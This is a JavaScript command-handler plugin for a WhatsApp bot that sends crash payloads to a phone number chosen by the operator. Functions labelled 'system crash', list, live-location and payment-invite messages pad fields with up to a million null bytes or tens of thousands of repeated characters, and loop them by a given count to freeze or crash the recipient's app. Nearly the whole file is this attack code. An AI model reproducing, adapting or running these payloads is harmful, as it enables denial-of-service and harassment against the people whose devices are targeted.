const { bugrafael } = require('../lib/bugrafael')

// Helper function to sleep for a given number of milliseconds
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

// Function to send reactions
const sendReaction = async (conn, m, reactionContent) => {
  try {
    await conn.sendMessage(m.chat, {
      react: {
        text: reactionContent,
        key: m.key
      }
    });
  } catch (error) {
    console.error('Error sending reaction:', error);
  }
};

// Function to send repeated messages
const sendRepeatedMessages = async (conn, jid, count, m) => {
  for (let i = 0; i < count; i++) {
    try {
      await conn.sendMessage(jid, { text: ''.repeat(50000) }, { quoted: m });
    } catch (error) {
      console.error('Error sending repeated messages:', error);
    }
  }
};

// Function to send view-once messages
const sendViewOnceMessages = async (conn, jid, count) => {
  for (let i = 0; i < count; i++) {
    try {
      let messageContent = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
          message: {
            interactiveMessage: proto.Message.InteractiveMessage.create({
              body: proto.Message.InteractiveMessage.Body.create({ text: '' }),
              footer: proto.Message.InteractiveMessage.Footer.create({ text: '' }),
              header: proto.Message.InteractiveMessage.Header.create({
                title: '',
                subtitle: '',
                hasMediaAttachment: false
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{\"display_text\":\"".repeat(50000) + "\",\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
                }],
                messageParamsJson: "\0".repeat(100000)
              })
            })
          }
        }
      }, {});
      await conn.relayMessage(jid, messageContent.message, { messageId: messageContent.key.id });
    } catch (error) {
      console.error('Error sending view-once messages:', error);
    }
  }
};

// Function to send system crash messages
const sendSystemCrashMessage = async (conn, jid) => {
  try {
    let messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: { title: '', subtitle: " " },
            body: { text: "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" },
            footer: { text: 'xp' },
            nativeFlowMessage: {
              buttons: [{
                name: 'cta_url',
                buttonParamsJson: "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }"
              }],
              messageParamsJson: "\0".repeat(1000000)
            }
          }
        }
      }
    }), { userJid: jid });
    await conn.relayMessage(jid, messageContent.message, { participant: { jid: jid }, messageId: messageContent.key.id });
  } catch (error) {
    console.error('Error sending system crash message:', error);
  }
};

// Function to send list messages
const sendListMessage = async (conn, jid) => {
  try {
    let messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
      listMessage: {
        title: "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
        footerText: "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
        description: "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
        buttonText: null,
        listType: 2,
        productListInfo: {
          productSections: [{ title: "lol", products: [{ productId: "4392524570816732" }] }],
          productListHeaderImage: { productId: "4392524570816732", jpegThumbnail: null },
          businessOwnerJid: "0@s.whatsapp.net"
        }
      },
      footer: "lol",
      contextInfo: {
        expiration: 600000,
        ephemeralSettingTimestamp: "1679959486",
        entryPointConversionSource: "global_search_new_chat",
        entryPointConversionApp: "whatsapp",
        entryPointConversionDelaySeconds: 9,
        disappearingMode: { initiator: "INITIATED_BY_ME" }
      },
      selectListType: 2,
      product_header_info: { product_header_info_id: 292928282928, product_header_is_rejected: false }
    }), { userJid: jid });

    await conn.relayMessage(jid, messageContent.message, { participant: { jid: jid }, messageId: messageContent.key.id });
  } catch (error) {
    console.error('Error sending list message:', error);
  }
};

// Function to send live location messages
const sendLiveLocationMessage = async (conn, jid) => {
  try {
    let messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: 'p',
            degreesLongitude: 'p',
            caption: '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
            sequenceNumber: '0',
            jpegThumbnail: ''
          }
        }
      }
    }), { userJid: jid });

    await conn.relayMessage(jid, messageContent.message, { participant: { jid: jid }, messageId: messageContent.key.id });
  } catch (error) {
    console.error('Error sending live location message:', error);
  }
};

// Function to send extended text messages
const sendExtendedTextMessage = async (conn, jid) => {
  try {
    await conn.sendMessage(jid, {
      extendedTextMessage: {
        text: '.',
        contextInfo: {
          stanzaId: jid,
          participant: jid,
          quotedMessage: { conversation: '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000) },
          disappearingMode: { initiator: "CHANGED_IN_CHAT", trigger: "CHAT_SETTING" }
        },
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }, { participant: { jid: jid }, messageId: null });
  } catch (error) {
    console.error('Error sending extended text message:', error);
  }
};

// Function to send payment invite
const sendPaymentInvite = async (conn, jid) => {
  try {
    await conn.sendMessage(jid, {
      paymentInviteMessage: {
        serviceType: "UPI",
        expiryTimestamp: Date.now() + 86400000
      }
    }, { participant: { jid: jid } });
  } catch (error) {
    console.error('Error sending payment invite:', error);
  }
};

// Function to send multiple payment invites
const sendMultiplePaymentInvites = async (conn, jid, count) => {
  for (let i = 0; i < count; i++) {
    try {
      await sendPaymentInvite(conn, jid);
      await sendExtendedTextMessage(conn, jid);
      await sleep(500);
    } catch (error) {
      console.error('Error sending multiple payment invites:', error);
    }
  }
};

// Function to send various messages
const sendVariousMessages = async (conn, jid, count) => {
  for (let i = 0; i < count; i++) {
    try {
      await sendListMessage(conn, jid);
      await sendLiveLocationMessage(conn, jid);
      await sendSystemCrashMessage(conn, jid);
      await sleep(500);
    } catch (error) {
      console.error('Error sending various messages:', error);
    }
  }
};

// Function to send repeated system crash messages
const sendRepeatedMessages2 = async (conn, jid, count) => {
  for (let i = 0; i < count; i++) {
    try {
      await sendSystemCrashMessage(conn, jid);
      await sendSystemCrashMessage(conn, jid);
      await sendSystemCrashMessage(conn, jid);
      await sleep(500);
    } catch (error) {
      console.error('Error sending repeated system crash messages:', error);
    }
  }
};

// Command handler
handler = async (m, { conn, text, command }) => {
  if (m.sender !== 'owner' && command !== 'ownerCommand') {
    console.log('Unauthorized user.');
    return;
  }

  let args = text.split(',');
  let jid = args[0] + '@s.whatsapp.net';
  let count = parseInt(args[1]) || 1;

  switch (command) {
    case 'wangy':
      await sendVariousMessages(conn, jid, count);
      break;
    case 'wangy1':
      await sendRepeatedMessages2(conn, jid, count);
      break;
    case 'harum1':
      await sendMultiplePaymentInvites(conn, jid, count);
      break;
    case 'harum':
      await sendPaymentInvite(conn, jid);
      break;
    case 'gcharum':
      await sendRepeatedMessages(conn, jid, count, m);
      break;
    case 'temui':
      await sendListMessage(conn, jid);
      break;
    case 'sui':
      await sendLiveLocationMessage(conn, jid);
      break;
    default:
      console.log('Unknown command:', command);
  }
};

module.exports = handler;
